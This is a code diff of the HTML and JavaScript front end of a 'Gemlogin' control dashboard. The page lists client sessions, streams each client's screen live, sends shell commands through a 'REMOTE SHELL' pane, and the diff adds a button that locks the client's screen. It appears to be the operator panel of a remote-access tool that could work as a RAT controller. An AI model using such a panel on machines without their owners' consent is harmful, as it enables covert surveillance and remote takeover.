@@ -3,7 +3,6 @@
 <html>
 <head>
     <title>Gemlogin - Control Dashboard</title>
-    <!-- THÊM THƯ VIỆN split.js ĐỂ KÉO THAY ĐỔI KÍCH THƯỚC -->
     <script src="https://unpkg.com/split.js/dist/split.min.js"></script>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
@@ -18,8 +17,10 @@
         .dashboard-container { display: flex; height: 100vh; }
         /* Sidebar */
         #sidebar { width: 300px; background-color: var(--dark-red); border-right: 2px solid var(--main-red); display: flex; flex-direction: column; flex-shrink: 0; }
-        #sidebar-header { padding: 20px; text-align: center; border-bottom: 2px solid var(--main-red); }
+        #sidebar-header { padding: 20px; text-align: center; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center;}
         #sidebar-header h1 { color: var(--main-red); margin: 0; font-size: 1.8em; text-shadow: 0 0 8px var(--main-red); }
+        #logout-btn { background: none; border: 1px solid var(--main-red); color: var(--main-red); padding: 5px 10px; cursor: pointer; transition: all 0.2s;}
+        #logout-btn:hover { background: var(--main-red); color: var(--main-bg); }
         #client-list-container { flex-grow: 1; overflow-y: auto; }
         #client-list { list-style: none; padding: 10px 0; margin: 0; }
         #client-list li { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #333; transition: background-color 0.2s; word-wrap: break-word; font-size: 0.9em; }
@@ -31,8 +32,12 @@
         #session-placeholder { flex-grow: 1; display: flex; align-items: center; justify-content: center; font-size: 1.5em; color: #444; text-align: center; }
         #session-view-content { display: none; height: 100%; flex-direction: column; }
         #session-view-content.visible { display: flex; }
+        /* Session Controls */
+        #session-controls { padding: 0 0 15px 0; }
+        #lock-screen-btn { background: var(--dark-red); border: 2px solid var(--main-red); color: var(--main-red); padding: 10px 20px; font-family: var(--font-main); font-size: 1em; cursor: pointer; transition: all 0.2s;}
+        #lock-screen-btn.locked { background: var(--main-red); color: var(--main-bg); border-color: #fff; box-shadow: 0 0 10px #fff; }
         /* Split.js Layout */
-        .split-container { display: flex; flex-direction: column; height: 100%; }
+        .split-container { display: flex; flex-direction: column; flex-grow: 1; }
         .live-view-pane { overflow: hidden; display: flex; justify-content: center; align-items: center; background: #000; border: 2px solid var(--main-red); }
         #screen-image { max-width: 100%; max-height: 100%; object-fit: contain; }
         .gutter { background-color: #333; }
@@ -48,7 +53,6 @@
         .terminal-pane.collapsed #command-center { display: none; }
         #command-output-container { background-color: #000; border: 1px solid #333; flex-grow: 1; overflow-y: auto; padding: 10px; margin-bottom: 10px; }
         #command-output { white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; }
-        #command-output .prompt { color: var(--bright-green); }
         #command-input-container { display: flex; }
         #prompt-symbol { color: var(--bright-green); font-weight: bold; font-size: 1.2em; padding-right: 10px; line-height: 1.5; }
         #command-input { flex-grow: 1; background: #000; border: 1px solid var(--main-red); color: var(--bright-green); padding: 8px; font-family: var(--font-main); font-size: 1.1em; outline: none; }
@@ -58,22 +62,23 @@
 </head>
 <body>
     <div class="dashboard-container">
-        <!-- LEFT SIDEBAR -->
         <div id="sidebar">
-            <div id="sidebar-header"> <h1>GEMLOGIN</h1> </div>
+            <div id="sidebar-header">
+                <h1>GEMLOGIN</h1>
+                <button id="logout-btn" onclick="window.location.href='/logout'">Logout</button>
+            </div>
             <div id="client-list-container">
                 <ul id="client-list"> <li class="no-clients">Waiting for sessions...</li> </ul>
             </div>
         </div>
-
-        <!-- RIGHT MAIN VIEW -->
         <div id="main-view">
             <div id="session-placeholder"> <p>← Select a session from the list to begin</p> </div>
             <div id="session-view-content">
+                <div id="session-controls">
+                    <button id="lock-screen-btn">LOCK SCREEN</button>
+                </div>
                 <div class="split-container">
-                    <div class="live-view-pane" id="split-0">
-                        <img id="screen-image" alt="Live Screen">
-                    </div>
+                    <div class="live-view-pane" id="split-0"> <img id="screen-image" alt="Live Screen"> </div>
                     <div class="terminal-pane" id="split-1">
                         <div id="terminal-header">
                             <h3>REMOTE SHELL</h3>
@@ -93,47 +98,61 @@
         </div>
     </div>
     <script>
-        const socket = io(); let currentViewingClientId = null; let splitInstance = null;
+        const socket = io(); let currentViewingClientId = null; let splitInstance = null; let isClientLocked = false;
         const ui = {
             clientList: document.getElementById('client-list'), placeholder: document.getElementById('session-placeholder'),
             sessionContent: document.getElementById('session-view-content'), screenImage: document.getElementById('screen-image'),
             commandOutput: document.getElementById('command-output'), commandInput: document.getElementById('command-input'),
             commandBtn: document.getElementById('command-btn'), toggleTerminalBtn: document.getElementById('toggle-terminal-btn'),
-            terminalPane: document.querySelector('.terminal-pane'),
+            terminalPane: document.querySelector('.terminal-pane'), lockScreenBtn: document.getElementById('lock-screen-btn'),
         };
 
-        function initializeSplitView() {
-            if (splitInstance) splitInstance.destroy();
-            splitInstance = Split(['#split-0', '#split-1'], { sizes: [65, 35], minSize: [200, 200], direction: 'vertical', cursor: 'row-resize', gutterSize: 10, });
-        }
+        function initializeSplitView() { if (splitInstance) { splitInstance.destroy(); } splitInstance = Split(['#split-0', '#split-1'], { sizes: [65, 35], minSize: [100, 100], direction: 'vertical', cursor: 'row-resize', gutterSize: 10, }); }
         function selectSession(clientId) {
             if (currentViewingClientId === clientId) return;
-            currentViewingClientId = clientId; ui.placeholder.style.display = 'none'; ui.sessionContent.classList.add('visible');
-            initializeSplitView();
+            currentViewingClientId = clientId; isClientLocked = false; ui.placeholder.style.display = 'none'; ui.sessionContent.classList.add('visible');
+            initializeSplitView(); updateLockScreenButton();
             ui.screenImage.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-            ui.commandOutput.innerHTML = `Connected to shell for <b style="color:var(--main-red);">${clientId}</b>...`;
+            ui.commandOutput.innerHTML = '';
+            const connectMsg = document.createElement('span');
+            connectMsg.innerHTML = `Connected to shell for <b style="color:var(--main-red);">${clientId}</b>...`;
+            ui.commandOutput.appendChild(connectMsg);
             document.querySelectorAll('#client-list li').forEach(item => item.classList.toggle('active', item.dataset.clientId === clientId));
         }
         function updateClientList(clientIds) {
-            ui.clientList.innerHTML = '';
-            const oldViewingId = currentViewingClientId;
+            ui.clientList.innerHTML = ''; const oldViewingId = currentViewingClientId;
             if (!clientIds || clientIds.length === 0) { ui.clientList.innerHTML = '<li class="no-clients">No active sessions.</li>'; currentViewingClientId = null; ui.placeholder.style.display = 'flex'; ui.sessionContent.classList.remove('visible'); return; }
             clientIds.forEach(id => { const li = document.createElement('li'); li.textContent = id; li.dataset.clientId = id; li.addEventListener('click', () => selectSession(id)); ui.clientList.appendChild(li); });
             if (oldViewingId && !clientIds.includes(oldViewingId)) { ui.placeholder.style.display = 'flex'; ui.sessionContent.classList.remove('visible'); currentViewingClientId = null; }
             if(currentViewingClientId) { ui.clientList.querySelector(`[data-client-id="${currentViewingClientId}"]`)?.classList.add('active'); }
         }
-        function sendCommand() {
-            const command = ui.commandInput.value.trim(); if (command === '' || !currentViewingClientId) return;
-            socket.emit('execute_command', { client_id: currentViewingClientId, command: command }); ui.commandInput.value = '';
+        function sendCommand() { const command = ui.commandInput.value.trim(); if (command === '' || !currentViewingClientId) return; socket.emit('execute_command', { client_id: currentViewingClientId, command: command }); ui.commandInput.value = ''; }
+        function toggleTerminal() { const isCollapsed = ui.terminalPane.classList.toggle('collapsed'); ui.toggleTerminalBtn.classList.toggle('collapsed', isCollapsed); if (!isCollapsed) { splitInstance.setSizes([65, 35]); } }
+        function toggleLockScreen() {
+            if (!currentViewingClientId) return;
+            isClientLocked = !isClientLocked;
+            socket.emit('toggle_lock_screen', { client_id: currentViewingClientId, lock_state: isClientLocked });
+            updateLockScreenButton();
         }
-        function toggleTerminal() {
-            const isCollapsed = ui.terminalPane.classList.toggle('collapsed'); ui.toggleTerminalBtn.classList.toggle('collapsed', isCollapsed);
-            if (!isCollapsed) { splitInstance.setSizes([65, 35]); }
+        function updateLockScreenButton() {
+            if (isClientLocked) {
+                ui.lockScreenBtn.textContent = 'UNLOCK SCREEN';
+                ui.lockScreenBtn.classList.add('locked');
+            } else {
+                ui.lockScreenBtn.textContent = 'LOCK SCREEN';
+                ui.lockScreenBtn.classList.remove('locked');
+            }
         }
-        socket.on('connect', () => socket.emit('subscribe_to_admin_updates')); socket.on('update_client_list', updateClientList);
-        socket.on('new_frame', d => { if (d.client_id === currentViewingClientId) ui.screenImage.src = 'data:image/jpeg;base64,' + d.image; });
-        socket.on('command_result', d => { if (d.client_id === currentViewingClientId) { const s = d.output.replace(/</g, "<").replace(/>/g, ">"); ui.commandOutput.innerHTML += `\n${s}`; ui.commandOutput.parentElement.scrollTop = ui.commandOutput.parentElement.scrollHeight; }});
+
+        socket.on('connect', () => { console.log("Socket connected, subscribing to admin updates..."); socket.emit('subscribe_to_admin_updates'); });
+        socket.on('disconnect', () => console.log("Socket disconnected."));
+        socket.on('connect_error', (err) => { console.error("Connection Error:", err.message); });
+        socket.on('update_client_list', updateClientList);
+        socket.on('new_frame', d => { if (d.client_id === currentViewingClientId && !isClientLocked) ui.screenImage.src = 'data:image/jpeg;base64,' + d.image; });
+        socket.on('command_result', d => { if (d.client_id === currentViewingClientId) { const outputNode = document.createTextNode('\n' + d.output); ui.commandOutput.appendChild(outputNode); ui.commandOutput.parentElement.scrollTop = ui.commandOutput.parentElement.scrollHeight; }});
+        
         ui.commandBtn.addEventListener('click', sendCommand); ui.commandInput.addEventListener('keyup', e => e.key === 'Enter' && sendCommand()); ui.toggleTerminalBtn.addEventListener('click', toggleTerminal);
+        ui.lockScreenBtn.addEventListener('click', toggleLockScreen);
     </script>
 </body>
 </html>
